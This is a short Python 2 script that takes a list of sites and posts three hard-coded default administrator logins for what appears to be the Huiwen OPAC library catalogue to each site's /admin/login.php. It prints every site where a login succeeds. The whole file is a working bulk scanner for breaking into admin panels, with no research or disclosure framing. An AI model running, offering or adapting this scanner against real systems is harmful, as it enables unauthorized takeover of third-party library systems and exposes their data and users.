# -*- coding: cp936 -*-
import requests

headers={'Content-Type':'application/x-www-form-urlencoded'}
def check(url):
    test1={'username':'opac_admin','passwd':'huiwen_opac'}
    test2={'username': 'view_admin', 'passwd': 'huiwen_opac'}
    test3={'username':'map_admin','passwd':'huiwen_opac'}
    try:
        rep1=requests.post(url,data=test1,headers=headers,allow_redirects=False)
        rep2=requests.post(url,data=test2,headers=headers,allow_redirects=False)
        rep3=requests.post(url,data=test3,headers=headers,allow_redirects=False)
        if rep1.status_code==302:
            print url+'      opac_admin'
        if rep2.status_code==302:
            print url+'      view_admin'
        if rep3.status_code==302:
            print url+'      map_admin'
    except Exception,e:
        pass

test=0
with open('hello_world.txt','r') as f:
    for i in f.readlines():
        test+=1
        print test
        url=i.strip('\n')
        test_url_1=url+'/admin/login.php'
        check(test_url_1)


